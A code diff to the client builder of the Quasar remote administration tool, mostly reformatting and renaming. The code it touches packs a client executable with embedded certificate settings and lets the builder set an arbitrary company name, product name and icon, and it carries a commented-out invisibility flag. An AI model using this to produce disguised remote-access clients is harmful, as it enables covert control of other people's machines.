@@ -1,17 +1,12 @@
-﻿using Mono.Cecil;
-using Mono.Cecil.Cil;
-using Quasar.Common.Cryptography;
-using Quasar.Server.Models;
-using System;
-using System.Security.Cryptography;
-using System.Security.Cryptography.X509Certificates;
-using System.Text;
-using System.IO;
-using System.Diagnostics;
-using Vestris.ResourceLib;
+﻿using Mono.Cecil.Cil;
 using Quasar.Common;
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Security.Cryptography.X509Certificates;
+using Vestris.ResourceLib;
 
-namespace Quasar.Server.Build
+namespace Quasar.Server
 {
     /// <summary>
     /// Provides methods used to create a custom client executable.
@@ -43,16 +38,16 @@ namespace Quasar.Server.Build
             File.WriteAllText("Builder\\run.bat", "Client.exe");
             File.WriteAllBytes("Builder\\BatToExe.exe", Properties.Resources.BatToExe);
             // Write client settings
-            File.WriteAllBytes("Stub\\core.lib",_options.ExportBinary(new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable)));
+            File.WriteAllBytes("Stub\\core.lib", _options.ExportBinary(new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable)));
             var args = $"/bat Builder\\run.bat /exe \"{_options.OutputPath}\" /x64 /wordkdir 0 /extracdir 0 /overwrite /attributes";
             // args+=" /invisible";
             foreach (var f in Directory.GetFiles("Stub\\"))
             {
                 args+=$" /include \"{f}\"";
             }
-            var p=Process.Start("Builder\\BatToExe.exe", args);
+            var p = Process.Start("Builder\\BatToExe.exe", args);
             p.WaitForExit();
-            if(p.ExitCode != 0)
+            if (p.ExitCode != 0)
             {
                 throw new Exception("Error occured when building client");
             }
@@ -65,7 +60,7 @@ namespace Quasar.Server.Build
                 versionResource.ProductVersion = _options.AssemblyInformation[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
+                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                 stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                 stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
@@ -79,7 +74,7 @@ namespace Quasar.Server.Build
 
                 versionResource.SaveTo(_options.OutputPath);
             }
-            
+
             // PHASE 5 - Icon changing
             if (!string.IsNullOrEmpty(_options.IconPath))
             {
@@ -97,7 +92,7 @@ namespace Quasar.Server.Build
 
             foreach (var typeDef in asmDef.Modules[0].Types)
             {
-                if (typeDef.FullName == "Quasar.Client.Config.Settings")
+                if (typeDef.FullName == "Quasar.Client.Settings")
                 {
                     foreach (var methodDef in typeDef.Methods)
                     {
